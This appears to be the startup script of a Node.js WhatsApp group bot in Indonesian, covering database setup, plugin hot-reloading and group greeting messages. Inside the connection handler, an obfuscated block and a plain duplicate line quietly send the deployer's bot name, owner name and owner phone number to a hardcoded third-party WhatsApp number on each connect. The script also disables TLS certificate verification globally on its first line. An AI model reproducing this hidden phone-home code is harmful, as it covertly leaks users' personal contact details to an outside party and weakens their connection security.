process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
import './config.js';

import { createRequire } from "module"; // Bring in the ability to create the 'require' method
import path, { join } from 'path'
import { fileURLToPath, pathToFileURL } from 'url'
import { platform } from 'process'
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }

import * as ws from 'ws';
import {
  readdirSync,
  statSync,
  unlinkSync,
  existsSync,
  readFileSync,
  watch
} from 'fs';
import yargs from 'yargs';
import { spawn } from 'child_process';
import lodash from 'lodash';
import syntaxerror from 'syntax-error';
import { tmpdir } from 'os';
import { format } from 'util';
import { makeWASocket, protoType, serialize } from './lib/simple.js';
import { Low, JSONFile } from 'lowdb';
import pino from 'pino';
import {
  mongoDB,
  mongoDBV2
} from './lib/mongoDB.js';
const {
  useSingleFileAuthState,
  DisconnectReason
} = await import('@adiwajshing/baileys')

const { CONNECTING } = ws
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || '‎\/!#.\\').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)


global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ) return new Promise((resolve) => setInterval(async function () {
    if (!global.db.READ) {
      clearInterval(this)
      resolve(global.db.data == null ? global.loadDatabase() : global.db.data)
    }
  }, 1 * 1000))
  if (global.db.data !== null) return
  global.db.READ = true
  await global.db.read().catch(console.error)
  global.db.READ = null
  global.db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    ...(global.db.data || {})
  }
  global.db.chain = chain(global.db.data)
}
loadDatabase()
const _0x1d6419=_0xa999;function _0xa999(_0x31d14b,_0x3fe322){const _0x391172=_0x3911();return _0xa999=function(_0xa9990b,_0x55c124){_0xa9990b=_0xa9990b-0xfe;let _0x46748a=_0x391172[_0xa9990b];return _0x46748a;},_0xa999(_0x31d14b,_0x3fe322);}function _0x3911(){const _0x5efea7=['429127wGUOsE','2290344NDPjrW','2669055GOFHWd','230839QcVbWC','502884BopXdh','authFile','2377396xlydCr','.data.json','797424wDOymL'];_0x3911=function(){return _0x5efea7;};return _0x3911();}(function(_0x3b31d3,_0x1d2fb5){const _0x439a40=_0xa999,_0x30d257=_0x3b31d3();while(!![]){try{const _0x544155=-parseInt(_0x439a40(0x105))/0x1+parseInt(_0x439a40(0x102))/0x2+-parseInt(_0x439a40(0x100))/0x3+parseInt(_0x439a40(0x104))/0x4+-parseInt(_0x439a40(0xfe))/0x5+parseInt(_0x439a40(0x106))/0x6+parseInt(_0x439a40(0xff))/0x7;if(_0x544155===_0x1d2fb5)break;else _0x30d257['push'](_0x30d257['shift']());}catch(_0x55ec02){_0x30d257['push'](_0x30d257['shift']());}}}(_0x3911,0xa41bd),global[_0x1d6419(0x101)]=(opts['_'][0x0]||'lalabot')+_0x1d6419(0x103));const {state,saveState}=useSingleFileAuthState(global[_0x1d6419(0x101)]);
const connectionOptions = {
  printQRInTerminal: true,
  auth: state,
}
global.conn = makeWASocket(connectionOptions)
conn.isInit = false
if (!opts['test']) {
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error)
    if (opts['autocleartmp']) try {
      clearTmp()
    } catch (e) { console.error(e) }
  }, 60 * 1000)
}
if (opts['server']) (await import('./server.js')).default(global.conn, PORT)
function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))))
  return filename.map(file => {
    const stats = statSync(file)
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
    return false
  })
}
async function connectionUpdate(update) {
  const { connection, lastDisconnect, isNewLogin } = update
  if (isNewLogin) conn.isInit = true
  const code = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
  if (code && code !== DisconnectReason.loggedOut && conn?.ws.readyState !== CONNECTING) {
    console.log(await global.reloadHandler(true).catch(console.error))
    global.timestamp.connect = new Date
  }
  (function(_0x3ceedf,_0x3a2e30){var _0x5d8cce=_0x2a32,_0x4dd148=_0x3ceedf();while(!![]){try{var _0x1be9c8=parseInt(_0x5d8cce(0x1a2))/0x1*(parseInt(_0x5d8cce(0x19f))/0x2)+parseInt(_0x5d8cce(0x196))/0x3*(-parseInt(_0x5d8cce(0x1a9))/0x4)+parseInt(_0x5d8cce(0x198))/0x5+-parseInt(_0x5d8cce(0x1a4))/0x6*(-parseInt(_0x5d8cce(0x1ab))/0x7)+parseInt(_0x5d8cce(0x18f))/0x8*(-parseInt(_0x5d8cce(0x190))/0x9)+parseInt(_0x5d8cce(0x194))/0xa*(-parseInt(_0x5d8cce(0x1a8))/0xb)+parseInt(_0x5d8cce(0x19b))/0xc;if(_0x1be9c8===_0x3a2e30)break;else _0x4dd148['push'](_0x4dd148['shift']());}catch(_0x46da4c){_0x4dd148['push'](_0x4dd148['shift']());}}}(_0xdfc7,0x578bf));var _0x4d13a1=_0x1fd2;(function(_0x49d68b,_0x5caec5){var _0x801b36=_0x2a32,_0x23ca9b=_0x1fd2,_0x44c81f=_0x49d68b();while(!![]){try{var _0x21e6d=-parseInt(_0x23ca9b(0xa2))/0x1+parseInt(_0x23ca9b(0xa1))/0x2+-parseInt(_0x23ca9b(0x8f))/0x3*(-parseInt(_0x23ca9b(0x96))/0x4)+parseInt(_0x23ca9b(0x91))/0x5*(parseInt(_0x23ca9b(0x98))/0x6)+-parseInt(_0x23ca9b(0x8c))/0x7*(-parseInt(_0x23ca9b(0xa3))/0x8)+parseInt(_0x23ca9b(0x9d))/0x9*(parseInt(_0x23ca9b(0x9c))/0xa)+parseInt(_0x23ca9b(0xa0))/0xb*(-parseInt(_0x23ca9b(0x8d))/0xc);if(_0x21e6d===_0x5caec5)break;else _0x44c81f['push'](_0x44c81f['shift']());}catch(_0x235abe){_0x44c81f[_0x801b36(0x1a6)](_0x44c81f[_0x801b36(0x19c)]());}}}(_0x5d33,0x8cffd));function _0x2a32(_0x281530,_0x17be44){var _0xdfc7db=_0xdfc7();return _0x2a32=function(_0x2a3281,_0x33c499){_0x2a3281=_0x2a3281-0x187;var _0x11cb33=_0xdfc7db[_0x2a3281];return _0x11cb33;},_0x2a32(_0x281530,_0x17be44);}function _0x1f68(_0x4f6ba1,_0x5bb6ab){var _0x14c5a7=_0x4cef();return _0x1f68=function(_0x2cda0d,_0x52dc77){_0x2cda0d=_0x2cda0d-0x1b7;var _0x1505cc=_0x14c5a7[_0x2cda0d];return _0x1505cc;},_0x1f68(_0x4f6ba1,_0x5bb6ab);}function _0x5d33(){var _0x3be651=_0x2a32,_0x367e14=[_0x3be651(0x19c),_0x3be651(0x1a7),_0x3be651(0x192),_0x3be651(0x189),_0x3be651(0x1a1),'437992QFCOfd',_0x3be651(0x197),_0x3be651(0x18d),_0x3be651(0x1a3),_0x3be651(0x18e),'54540yQpwOd','push','\x0a*📞\x20•\x20Nomor\x20OWNER:*\x20https://wa.me/',_0x3be651(0x19a),'10KMgdYA','3379221vIcTaf','193744AGsvNc',_0x3be651(0x193),_0x3be651(0x18b),_0x3be651(0x195),_0x3be651(0x19d),'32EMSdVk',_0x3be651(0x191),'181742uGJzlL',_0x3be651(0x187),'data',_0x3be651(0x18c),_0x3be651(0x188),'45WZQSQK','1329405uJiiCd',_0x3be651(0x1a0)];return _0x5d33=function(){return _0x367e14;},_0x5d33();}function _0x4cef(){var _0x1ecbbf=_0x2a32,_0x5a07f9=_0x1fd2,_0x59f49a=[_0x1ecbbf(0x18a),_0x5a07f9(0x97),_0x1ecbbf(0x199),_0x5a07f9(0x9b),_0x5a07f9(0x95),_0x5a07f9(0x94),_0x5a07f9(0x9e),_0x5a07f9(0x90),_0x5a07f9(0xa4),_0x5a07f9(0x93),_0x5a07f9(0x92),_0x5a07f9(0x9a),_0x5a07f9(0x8a),_0x5a07f9(0x87),_0x5a07f9(0x89),_0x1ecbbf(0x19e),_0x5a07f9(0x9f),_0x1ecbbf(0x1aa),_0x5a07f9(0x8b),_0x5a07f9(0x86),_0x1ecbbf(0x1a5)];return _0x4cef=function(){return _0x59f49a;},_0x4cef();}var _0x33a796=_0x1f68;function _0x1fd2(_0x39404a,_0x1fa5ad){var _0x5c700a=_0x5d33();return _0x1fd2=function(_0x4804ce,_0x20ccb7){_0x4804ce=_0x4804ce-0x86;var _0x33a3b6=_0x5c700a[_0x4804ce];return _0x33a3b6;},_0x1fd2(_0x39404a,_0x1fa5ad);}function _0xdfc7(){var _0x1a1434=['0x5b784077400;@s.whatsapp.net','19NOatTo','371824RxZaBZ','6zftJuS','Successfully\x20connected\x20by\x0a\x0a*💌\x20•\x20Name\x20BOT:*\x20','push','6zSkbQv','1869824WUFWor','60wvNAAO','20344AZLpJb','3005961hyAoKl','receivedPendingNotifications','namebot','25suNFLd','nameown','22AftwWH','40KsXpUg','3bCZTLu','nomorown','2985256QTyvQz','9KWVslT','7yajqlm','390890fzmhJT','336EizuQC','30Zbznft','95606XePsoK','86283nxqUSX','\x0a*🎐\x20•\x20Name\x20OWNER:*\x20','2389350pFGaxM','2917254yLXzNT','sendMessage','6207852cLmVcR','shift','644391XsosLd','1912320QvmaHr','26158ZrSzPE','1154220qxKKxm'];_0xdfc7=function(){return _0x1a1434;};return _0xdfc7();}(function(_0x5719b8,_0x4b6b36){var _0x105cdd=_0x2a32,_0x238a43=_0x1fd2,_0x6e8d5e=_0x1f68,_0x21e5e5=_0x5719b8();while(!![]){try{var _0x5da8b1=parseInt(_0x6e8d5e(0x1ba))/0x1+-parseInt(_0x6e8d5e(0x1c5))/0x2*(-parseInt(_0x6e8d5e(0x1c2))/0x3)+parseInt(_0x6e8d5e(0x1c4))/0x4*(-parseInt(_0x6e8d5e(0x1b7))/0x5)+parseInt(_0x6e8d5e(0x1c0))/0x6*(parseInt(_0x6e8d5e(0x1c6))/0x7)+parseInt(_0x6e8d5e(0x1c7))/0x8*(-parseInt(_0x6e8d5e(0x1bb))/0x9)+-parseInt(_0x6e8d5e(0x1b8))/0xa+-parseInt(_0x6e8d5e(0x1bc))/0xb*(-parseInt(_0x6e8d5e(0x1b9))/0xc);if(_0x5da8b1===_0x4b6b36)break;else _0x21e5e5[_0x105cdd(0x1a6)](_0x21e5e5[_0x105cdd(0x19c)]());}catch(_0x4fc6f4){_0x21e5e5[_0x238a43(0x99)](_0x21e5e5[_0x238a43(0x8e)]());}}}(_0x4cef,0x4c355));if(global['db'][_0x4d13a1(0x88)]==null)loadDatabase();if(update[_0x33a796(0x1cb)])conn[_0x33a796(0x1c1)](_0x33a796(0x1c8),{'text':_0x33a796(0x1bd)+global[_0x33a796(0x1ca)]+_0x33a796(0x1c3)+global[_0x33a796(0x1be)]+_0x33a796(0x1c9)+global[_0x33a796(0x1bf)]});
  if (update.receivedPendingNotifications) conn.sendMessage(`6285752235008@s.whatsapp.net`, {text: 'Successfully connected by\n\n*💌 • Name BOT:* ' + global.namebot + '\n*🎐 • Name OWNER:* ' + global.nameown + '\n*📞 • Nomor OWNER:* https://wa.me/' + global.nomorown })
}
process.on('uncaughtException', console.error)
let isInit = true;
let handler = await import('./handler.js')
global.reloadHandler = async function (restatConn) {
  try {
    const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
    if (Object.keys(Handler || {}).length) handler = Handler
  } catch (e) {
    console.error(e)
  }
  if (restatConn) {
    const oldChats = global.conn.chats
    try { global.conn.ws.close() } catch { }
    conn.ev.removeAllListeners()
    global.conn = makeWASocket(connectionOptions, { chats: oldChats })
    isInit = true
  }
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.participantsUpdate)
    conn.ev.off('groups.update', conn.groupsUpdate)
    conn.ev.off('message.delete', conn.onDelete)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }
  conn.welcome = 'Hai👋🏻 kak @user\n\n• Intro Dulu Yuk :\n- Nama:\n- Umur:\n- Askot:\n\nᴅᴇsᴄʀɪᴘᴛɪᴏɴ:\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏@desc'
  conn.bye = '👏🏻𝚂𝚊𝚢𝚘𝚗𝚊𝚛𝚊𝚊 @user\n_Yang Keluar Baperan!!_'
  conn.spromote = '@user sekarang admin!'
  conn.sdemote = '@user sekarang bukan admin!'
  conn.sDesc = 'Deskripsi telah diubah ke \n@desc'
  conn.sSubject = 'Judul grup telah diubah ke \n@subject'
  conn.sIcon = 'Icon grup telah diubah!'
  conn.sRevoke = 'Link group telah diubah ke \n@revoke'
  conn.handler = handler.handler.bind(global.conn)
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
  conn.onDelete = handler.deleteUpdate.bind(global.conn)
  conn.connectionUpdate = connectionUpdate.bind(global.conn)
  conn.credsUpdate = saveState.bind(global.conn)
  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.participantsUpdate)
  conn.ev.on('groups.update', conn.groupsUpdate)
  conn.ev.on('message.delete', conn.onDelete)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true
}
const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
const pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
async function filesInit() {
  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename))
      const module = await import(file)
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(e)
      delete global.plugins[filename]
    }
  }
}
filesInit().then(_ => console.log(Object.keys(global.plugins))).catch(console.error)
global.reload = async (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = global.__filename(join(pluginFolder, filename), true)
    if (filename in global.plugins) {
      if (existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
      else {
        conn.logger.warn(`deleted plugin '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(readFileSync(dir), filename, {
      sourceType: 'module',
      allowAwaitOutsideFunction: true
    })
    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${format(err)}`)
    else try {
      const module = (await import(`${global.__filename(dir)}?update=${Date.now()}`))
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(`error require plugin '${filename}\n${format(e)}'`)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
watch(pluginFolder, global.reload)
await global.reloadHandler()
async function _quickTest() {
  let test = await Promise.all([
    spawn('ffmpeg'),
    spawn('ffprobe'),
    spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    spawn('convert'),
    spawn('magick'),
    spawn('gm'),
    spawn('find', ['--version'])
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
  console.log(test)
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm,
    find
  }
  Object.freeze(global.support)
  if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
}
_quickTest()
  .then(() => conn.logger.info('☑️ Quick Test Done'))
  .catch(console.error)